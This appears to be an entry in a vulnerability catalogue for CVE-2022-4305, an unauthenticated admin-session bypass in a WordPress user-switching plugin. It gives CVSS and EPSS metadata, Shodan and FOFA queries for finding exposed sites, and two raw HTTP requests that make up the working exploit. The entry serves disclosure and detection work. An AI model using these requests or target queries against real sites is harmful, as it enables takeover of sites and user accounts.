---
layout: post
cve_id: CVE-2022-4305
title: Login as User or Customer < 3.3 - Privilege Escalation
pcap: true
pcap_path: /pcaps/2022/CVE-2022-4305.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-4305.yaml
snort2_rule: N/A
snort3_rule: N/A
author: r3Y3r53
severity: critical
impact: 'Unauthenticated attackers can obtain valid admin sessions by exploiting missing
  authorization checks in the Login as User or Customer plugin, potentially gaining
  complete control over the WordPress site and all user accounts.

  '
remediation: 'Fixed in version 3.3

  '
reference:
- https://wpscan.com/vulnerability/286d972d-7bda-455c-a226-fd9ce5f925bd
- https://nvd.nist.gov/vuln/detail/CVE-2022-4305
- https://github.com/cyllective/CVEs
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2022-4305
  cwe-id: CWE-269
  epss-score: 0.88869
  epss-percentile: 0.99495
  cpe: cpe:2.3:a:wp-buy:login_as_user_or_customer_\(user_switching\):*:*:*:*:*:wordpress:*:*
metadata:
  verified: true
  max-request: 2
  vendor: wp-buy
  product: login_as_user_or_customer_\(user_switching\)
  framework: wordpress
  shodan-query: http.html:/wp-content/plugins/login-as-customer-or-user
  fofa-query: body=/wp-content/plugins/login-as-customer-or-user
  publicwww-query: /wp-content/plugins/login-as-customer-or-user
tags:
- cve
- cve2022
- wpscan
- wordpress
- wp-plugin
- wp
- login-as-customer-or-user
- auth-bypass
- wp-buy
- vuln
---

## ðŸ” Vulnerability Description
The plugin lacks authorization checks to ensure that users are allowed to log in as another one, which could allow unauthenticated attackers to obtain a valid admin session.


## ðŸŒ HTTP Request
```nohighlight
GET /wp-admin/admin-ajax.php?action=loginas_return_admin HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh, Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Safari/605.1.15
Connection: close
Cookie: loginas_old_user_id=1
Accept-Encoding: gzip
```

```nohighlight
GET /wp-admin/users.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

